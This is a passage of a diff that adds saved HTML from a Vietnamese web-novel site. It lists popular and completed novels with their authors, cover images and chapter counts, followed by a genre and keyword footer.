+              <a href="https://truyennhieu.com/choc-tuc-vo-yeu-mua-mot-tang-mot" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">Chọc Tức Vợ Yêu - Mua Một Tặng Một</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/quan-quan-huu-yeu/5bdec66306c7c41b7eea0fe7" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">Quẫn Quẫn Hữu Yêu</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">6</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/hello-nguoi-thua-ke-xin-chao-nguoi-thua-ke" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Công Tử Diễn sáng tác">Hello, Người Thừa Kế (Xin Chào, Người Thừa Kế)</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/cong-tu-dien/5bdfb0ae8ee5f91f329933c1" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Công Tử Diễn sáng tác">Công Tử Diễn</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">7</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/be-ha-khong-the" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Đại Phi sáng tác">Bệ Hạ, Không Thể!!</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/dai-phi/5be720845ce85f4bc1f4ca73" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Đại Phi sáng tác">Đại Phi</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">8</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/khe-uoc-hao-mon" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cận Niên sáng tác">Khế Ước Hào Môn</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/can-nien/5be24afc7f0e2b2fdfe62712" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cận Niên sáng tác">Cận Niên</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">9</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/bo-truong-cao-lanh-cung-chieu-vo-yeu-tan-troi" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Công Tử Như Tuyết sáng tác">Bộ Trưởng Cao Lãnh: Cưng Chiều Vợ yêu Tận Trời</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/cong-tu-nhu-tuyet/5bf0271f4858996227e10241" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Công Tử Như Tuyết sáng tác">Công Tử Như Tuyết</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">10</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/phong-luu-thanh-vuong" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Sắc yy sáng tác">Phong Lưu Thánh Vương</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/sac-yy/5be67c379d614d46ffa63089" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Sắc yy sáng tác">Sắc yy</a></h4>
+          </div>
+        </li>
+      
+      </ul>
+      </div>
+  </div>
+</div>
+
+    </div>
+  </div>
+</div>
+<div class="box-top-novel">
+  <div class="wrap">
+    <div class="container">
+      <div class="tile-main-title">
+        <div class="box-icon"> <i class="truyenn-icon_hot"></i> </div>
+        <div class="box-txt-show">
+          <h2>Truyện đã hoàn thành</h2>
+        </div>
+      </div>
+      <div class="box-full-book">
+        <ul>
+					
+						<li>
+							<a href="https://truyennhieu.com/cha-nuoi-con-han-nguoi" class="img-left" title="Cha Nuôi! Con Hận Người! - Chun">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://cdnaz.truyenfull.vn/cover/o/eJzLyTDW1y0J042ycArxiMwN1Q8rLE3O8PbO1XX01HeEAi8jE32vFIskS1N_U9-cQP1yI0NT3QxjIyNdz2QTIwCfXhLZ/cha-nuoi-con-han-nguoi.jpg" title="Cha Nuôi! Con Hận Người! - Chun" alt="Cha Nuoi Con Han Nguoi - Chun" src="./truyennhieu_files/cha-nuoi-con-han-nguoi.webp" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/cha-nuoi-con-han-nguoi" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Chun sáng tác">Cha Nuôi! Con Hận Người!</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/chun/5d2612b3a288ba7b3e20c313" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Chun sáng tác">Chun</a></h4>
+								<span class="label-full">Full - 75 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/muon-trung-nghin-dam" class="img-left" title="Muôn Trùng Nghìn Dặm - Icey">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://cdnaz.truyenfull.vn/cover/eJzLyTDW98pOsUz1LoyPCApIcfMINKrIS6zID_csdi9NqfSLzwr3jjT2zHLxSDPw8TcusSzKDHBMTzQrcjcOcEm18PFwz7DI8HIOiyyJzPB2jDTwLq8scbQtNzI01c0wNjICAB4JHz8=/muon-trung-nghin-dam.jpg" title="Muôn Trùng Nghìn Dặm - Icey" alt="Muon Trung Nghin Dam - Icey" src="./truyennhieu_files/muon-trung-nghin-dam.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/muon-trung-nghin-dam" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Icey sáng tác">Muôn Trùng Nghìn Dặm</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/icey/5d261295a288ba7b3e20c2d9" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Icey sáng tác">Icey</a></h4>
+								<span class="label-full">Full - 56 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/mot-nu-hai-ba-nam" class="img-left" title="Một Nữ Hai Ba Nam - Lãnh Hủy">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775363/truyen/mot-nu-hai-ba-nam.jpg" title="Một Nữ Hai Ba Nam - Lãnh Hủy" alt="Mot Nu Hai Ba Nam - Lanh Huy" src="./truyennhieu_files/mot-nu-hai-ba-nam.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/mot-nu-hai-ba-nam" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Lãnh Hủy sáng tác">Một Nữ Hai Ba Nam</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/lanh-huy/5d26048ca288ba7b3e20c238" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Lãnh Hủy sáng tác">Lãnh Hủy</a></h4>
+								<span class="label-full">Full - 124 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/tich-mich-khong-dinh-xuan-duc-van-san-khong-vang-ve-tan-xuan" class="img-left" title="Tịch Mịch Không Đình Xuân Dục Vãn (Sân Không Vắng Vẻ Tàn Xuân) - Phỉ Ngã Tư Tồn">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775363/truyen/tich-mich-khong-dinh-xuan-duc-van-san-khong-vang-ve-tan-xuan.jpg" title="Tịch Mịch Không Đình Xuân Dục Vãn (Sân Không Vắng Vẻ Tàn Xuân) - Phỉ Ngã Tư Tồn" alt="Tich Mich Khong Dinh Xuan Duc Van San Khong Vang Ve Tan Xuan - Phi Nga Tu Ton" src="./truyennhieu_files/tich-mich-khong-dinh-xuan-duc-van-san-khong-vang-ve-tan-xuan.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/tich-mich-khong-dinh-xuan-duc-van-san-khong-vang-ve-tan-xuan" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Phỉ Ngã Tư Tồn sáng tác">Tịch Mịch Không Đình Xuân Dục Vãn (Sân Không Vắng Vẻ Tàn Xuân)</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/phi-nga-tu-ton/5be7a4265ce85f4bc1f4e33b" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Phỉ Ngã Tư Tồn sáng tác">Phỉ Ngã Tư Tồn</a></h4>
+								<span class="label-full">Full - 38 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/trau-tieu-thu-tim-kiem-tinh-yeu" class="img-left" title="Trâu Tiểu Thư Tìm Kiếm Tình Yêu - Phỉ Ngã Tư Tồn">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775363/truyen/trau-tieu-thu-tim-kiem-tinh-yeu.jpg" title="Trâu Tiểu Thư Tìm Kiếm Tình Yêu - Phỉ Ngã Tư Tồn" alt="Trau Tieu Thu Tim Kiem Tinh Yeu - Phi Nga Tu Ton" src="./truyennhieu_files/trau-tieu-thu-tim-kiem-tinh-yeu.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/trau-tieu-thu-tim-kiem-tinh-yeu" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Phỉ Ngã Tư Tồn sáng tác">Trâu Tiểu Thư Tìm Kiếm Tình Yêu</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/phi-nga-tu-ton/5be7a4265ce85f4bc1f4e33b" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Phỉ Ngã Tư Tồn sáng tác">Phỉ Ngã Tư Tồn</a></h4>
+								<span class="label-full">Full - 63 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/nay-cho-lam-loan" class="img-left" title="Này, Chớ Làm Loạn - Minh Nguyệt Thính Phong">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775364/truyen/nay-cho-lam-loan.jpg" title="Này, Chớ Làm Loạn - Minh Nguyệt Thính Phong" alt="Nay Cho Lam Loan - Minh Nguyet Thinh Phong" src="./truyennhieu_files/nay-cho-lam-loan.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/nay-cho-lam-loan" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Minh Nguyệt Thính Phong sáng tác">Này, Chớ Làm Loạn</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/minh-nguyet-thinh-phong/5be7bcf25ce85f4bc1f51269" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Minh Nguyệt Thính Phong sáng tác">Minh Nguyệt Thính Phong</a></h4>
+								<span class="label-full">Full - 65 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/ngon-tinh-ngu-yeu-ngu-giao-ky" class="img-left" title="[Ngôn Tình] Ngự Yêu (Ngự Giao Ký) - Cửu Lộ Phi Hương">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775363/truyen/ngon-tinh-ngu-yeu-ngu-giao-ky.jpg" title="[Ngôn Tình] Ngự Yêu (Ngự Giao Ký) - Cửu Lộ Phi Hương" alt="Ngon Tinh Ngu Yeu Ngu Giao Ky - Cuu Lo Phi Huong" src="./truyennhieu_files/ngon-tinh-ngu-yeu-ngu-giao-ky.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/ngon-tinh-ngu-yeu-ngu-giao-ky" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cửu Lộ Phi Hương sáng tác">[Ngôn Tình] Ngự Yêu (Ngự Giao Ký)</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/cuu-lo-phi-huong/5be724065ce85f4bc1f4d16f" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cửu Lộ Phi Hương sáng tác">Cửu Lộ Phi Hương</a></h4>
+								<span class="label-full">Full - 150 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/nu-an-su" class="img-left" title="Nữ Ân Sư - Thiên Như Ngọc">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562775363/truyen/nu-an-su.jpg" title="Nữ Ân Sư - Thiên Như Ngọc" alt="Nu An Su - Thien Nhu Ngoc" src="./truyennhieu_files/nu-an-su.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/nu-an-su" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thiên Như Ngọc sáng tác">Nữ Ân Sư</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/thien-nhu-ngoc/5be723295ce85f4bc1f4cfba" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thiên Như Ngọc sáng tác">Thiên Như Ngọc</a></h4>
+								<span class="label-full">Full - 76 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/thieu-gia-tho-o-va-co-be-kiem-si-hkl-2" class="img-left" title="Thiếu Gia Thờ Ơ Và Cô Bé Kiếm Sĩ - HKL 2 - Shuuya">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562691516/truyen/thieu-gia-tho-o-va-co-be-kiem-si-hkl-2.jpg" title="Thiếu Gia Thờ Ơ Và Cô Bé Kiếm Sĩ - HKL 2 - Shuuya" alt="Thieu Gia Tho O Va Co Be Kiem Si Hkl 2 - Shuuya" src="./truyennhieu_files/thieu-gia-tho-o-va-co-be-kiem-si-hkl-2.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/thieu-gia-tho-o-va-co-be-kiem-si-hkl-2" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Shuuya sáng tác">Thiếu Gia Thờ Ơ Và Cô Bé Kiếm Sĩ - HKL 2</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/shuuya/5bee3b014858996227dce422" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Shuuya sáng tác">Shuuya</a></h4>
+								<span class="label-full">Full - 89 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/truyen-thuyet-soi-tuyet-tap-truyen-may-mua-luc" class="img-left" title="Truyền Thuyết Sói Tuyết - Tập Truyện Mây Mưa Lục - A Tô">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/truyen-thuyet-soi-tuyet-tap-truyen-may-mua-luc.jpg" title="Truyền Thuyết Sói Tuyết - Tập Truyện Mây Mưa Lục - A Tô" alt="Truyen Thuyet Soi Tuyet Tap Truyen May Mua Luc - A To" src="./truyennhieu_files/truyen-thuyet-soi-tuyet-tap-truyen-may-mua-luc.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/truyen-thuyet-soi-tuyet-tap-truyen-may-mua-luc" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả A Tô sáng tác">Truyền Thuyết Sói Tuyết - Tập Truyện Mây Mưa Lục</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/a-to/5d241f5ea288ba7b3e20bd7e" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả A Tô sáng tác">A Tô</a></h4>
+								<span class="label-full">Full - 20 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/du-nhu-cuong-ca" class="img-left" title="Dữ Nhữ Cuồng Ca - Bất Nguyện Thành Song">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/du-nhu-cuong-ca.jpg" title="Dữ Nhữ Cuồng Ca - Bất Nguyện Thành Song" alt="Du Nhu Cuong Ca - Bat Nguyen Thanh Song" src="./truyennhieu_files/du-nhu-cuong-ca.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/du-nhu-cuong-ca" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Bất Nguyện Thành Song sáng tác">Dữ Nhữ Cuồng Ca</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/bat-nguyen-thanh-song/5d23a0dfa288ba7b3e20bd45" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Bất Nguyện Thành Song sáng tác">Bất Nguyện Thành Song</a></h4>
+								<span class="label-full">Full - 16 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/xuyen-den-cuoc-song-kho-buc-cua-giao-chu-ma-giao" class="img-left" title="Xuyên Đến Cuộc Sống Khổ Bức Của Giáo Chủ Ma Giáo - Thâm Mặc">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1560968084/truyen/xuyen-den-cuoc-song-kho-buc-cua-giao-chu-ma-giao.jpg" title="Xuyên Đến Cuộc Sống Khổ Bức Của Giáo Chủ Ma Giáo - Thâm Mặc" alt="Xuyen Den Cuoc Song Kho Buc Cua Giao Chu Ma Giao - Tham Mac" src="./truyennhieu_files/xuyen-den-cuoc-song-kho-buc-cua-giao-chu-ma-giao.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/xuyen-den-cuoc-song-kho-buc-cua-giao-chu-ma-giao" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thâm Mặc sáng tác">Xuyên Đến Cuộc Sống Khổ Bức Của Giáo Chủ Ma Giáo</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/tham-mac/5d0a4344a288ba7b3e208214" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thâm Mặc sáng tác">Thâm Mặc</a></h4>
+								<span class="label-full">Full - 72 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/mang-theo-con-di-ket-hon" class="img-left" title="Mang Theo Con Đi Kết Hôn - Tô Chấp Hạ">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/mang-theo-con-di-ket-hon.jpg" title="Mang Theo Con Đi Kết Hôn - Tô Chấp Hạ" alt="Mang Theo Con Di Ket Hon - To Chap Ha" src="./truyennhieu_files/mang-theo-con-di-ket-hon.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/mang-theo-con-di-ket-hon" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tô Chấp Hạ sáng tác">Mang Theo Con Đi Kết Hôn</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/to-chap-ha/5d233065a288ba7b3e20bc34" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tô Chấp Hạ sáng tác">Tô Chấp Hạ</a></h4>
+								<span class="label-full">Full - 50 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/ai-duc-manh-dong-va-ai-duc-loang-lo" class="img-left" title="Ái Dục Manh Động Và Ái Dục Loang Lỗ - Vi Quân">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/ai-duc-manh-dong-va-ai-duc-loang-lo.jpg" title="Ái Dục Manh Động Và Ái Dục Loang Lỗ - Vi Quân" alt="Ai Duc Manh Dong Va Ai Duc Loang Lo - Vi Quan" src="./truyennhieu_files/ai-duc-manh-dong-va-ai-duc-loang-lo.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/ai-duc-manh-dong-va-ai-duc-loang-lo" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vi Quân sáng tác">Ái Dục Manh Động Và Ái Dục Loang Lỗ</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/vi-quan/5c00e51a4170ae2f490d0f6a" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vi Quân sáng tác">Vi Quân</a></h4>
+								<span class="label-full">Full - 21 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/vat-vong-nga" class="img-left" title="Vật Vong Ngã - Thủ Trưởng Tỉnh Tứ Xuyên">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/vat-vong-nga.jpg" title="Vật Vong Ngã - Thủ Trưởng Tỉnh Tứ Xuyên" alt="Vat Vong Nga - Thu Truong Tinh Tu Xuyen" src="./truyennhieu_files/vat-vong-nga.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/vat-vong-nga" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thủ Trưởng Tỉnh Tứ Xuyên sáng tác">Vật Vong Ngã</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/thu-truong-tinh-tu-xuyen/5d22728aa288ba7b3e20bac2" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thủ Trưởng Tỉnh Tứ Xuyên sáng tác">Thủ Trưởng Tỉnh Tứ Xuyên</a></h4>
+								<span class="label-full">Full - 36 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/khuyen-anh-de-gioi-giai-tri" class="img-left" title="Khuyển Ảnh Đế Giới Giải Trí - Superpanda">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562679050/truyen/khuyen-anh-de-gioi-giai-tri.jpg" title="Khuyển Ảnh Đế Giới Giải Trí - Superpanda" alt="Khuyen Anh De Gioi Giai Tri - Superpanda" src="./truyennhieu_files/khuyen-anh-de-gioi-giai-tri.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/khuyen-anh-de-gioi-giai-tri" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Superpanda sáng tác">Khuyển Ảnh Đế Giới Giải Trí</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/superpanda/5bee23684858996227dc99cf" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Superpanda sáng tác">Superpanda</a></h4>
+								<span class="label-full">Full - 63 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/vuong-phi-13-tuoi" class="img-left" title="Vương Phi 13 Tuổi - Nhất Thế Phong Lưu">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://cdnaz.truyenfull.vn/cover/o/eJzLyTDT183Lj0xxzHLySzI20Q9ziw_zDAyNcnPz1HeEguyiYv0yd6dwb1Of_IDMbP1yI0NT3QxjIyMAU6ESeA==/vuong-phi-13-tuoi.jpg" title="Vương Phi 13 Tuổi - Nhất Thế Phong Lưu" alt="Vuong Phi 13 Tuoi - Nhat The Phong Luu" src="./truyennhieu_files/vuong-phi-13-tuoi.webp" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/vuong-phi-13-tuoi" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nhất Thế Phong Lưu sáng tác">Vương Phi 13 Tuổi</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/nhat-the-phong-luu/5bea7edd354e2d5eb5b97fa4" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nhất Thế Phong Lưu sáng tác">Nhất Thế Phong Lưu</a></h4>
+								<span class="label-full">Full - 766 chương</span> </div>
+						</li>
+					
+						<li>
+							<a href="https://truyennhieu.com/series-gia-toc-sullivan-ban-tinh-cua-toi-la-ma-ca-rong" class="img-left" title="Series Gia tộc Sullivan (Bạn Tình Của Tôi Là Ma Cà Rồng) - Điểu Quân">
+							<div class="box-absolute fn-shadow">
+								<div class="img">
+									<img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562486529/truyen/series-gia-toc-sullivan-ban-tinh-cua-toi-la-ma-ca-rong.jpg" title="Series Gia tộc Sullivan (Bạn Tình Của Tôi Là Ma Cà Rồng) - Điểu Quân" alt="Series Gia Toc Sullivan Ban Tinh Cua Toi La Ma Ca Rong - Dieu Quan" src="./truyennhieu_files/series-gia-toc-sullivan-ban-tinh-cua-toi-la-ma-ca-rong.jpg" data-loaded="true">
+								</div>
+							</div>
+							</a>
+							<div class="box-book-info">
+								<h3 class="font-title">
+									<a href="https://truyennhieu.com/series-gia-toc-sullivan-ban-tinh-cua-toi-la-ma-ca-rong" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Điểu Quân sáng tác">Series Gia tộc Sullivan (Bạn Tình Của Tôi Là Ma Cà Rồng)</a>
+								</h3>
+								<h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/dieu-quan/5d219f83a288ba7b3e20b418" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Điểu Quân sáng tác">Điểu Quân</a></h4>
+								<span class="label-full">Full - 24 chương</span> </div>
+						</li>
+					
+          <!--end list book 3 item -->
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="footer">
+    <div class="wrap">
+      <div class="container">
+        <ul>
+          <li>
+            <div class="label-ft">Thể loại hot</div>
+            <ul>
+              
+                  <li><a href="https://truyennhieu.com/the-loai/do-thi/5bdec27dc551731a60abe201" title="Truện Đô Thị">Đô Thị</a></li>
+              
+                  <li><a href="https://truyennhieu.com/the-loai/ngon-tinh/5bdec27dc551731a60abe1ff" title="Truện Ngôn Tình">Ngôn Tình</a></li>
+              
+                  <li><a href="https://truyennhieu.com/the-loai/tien-hiep/5bdec66306c7c41b7eea0fe4" title="Truện Tiên Hiệp">Tiên Hiệp</a></li>
+              
+                  <li><a href="https://truyennhieu.com/the-loai/hai-huoc/5bdec66306c7c41b7eea0fe6" title="Truện Hài Hước">Hài Hước</a></li>
+              
+                  <li><a href="https://truyennhieu.com/the-loai/sung/5bdec66306c7c41b7eea0fe8" title="Truện Sủng">Sủng</a></li>
+              
+            </ul>
+          </li>
+          <li class="keyword-fran">
+            <div class="label-ft">Top từ khóa</div>
+            
+              <ul>
+                
+                    <li><a href="https://truyennhieu.com/the-loai/trong-sinh/5bdfb00f8ee5f91f329931cc" title="Trọng Sinh">Trọng Sinh</a></li>
+                
+                    <li><a href="https://truyennhieu.com/the-loai/ngon-tinh/5bdec27dc551731a60abe1ff" title="Ngôn Tình">Ngôn Tình</a></li>
+                
+                    <li><a href="https://truyennhieu.com/choc-tuc-vo-yeu-mua-mot-tang-mot" title="Chọc Tức Vợ Yêu">Chọc Tức Vợ Yêu</a></li>
+                
+              </ul>
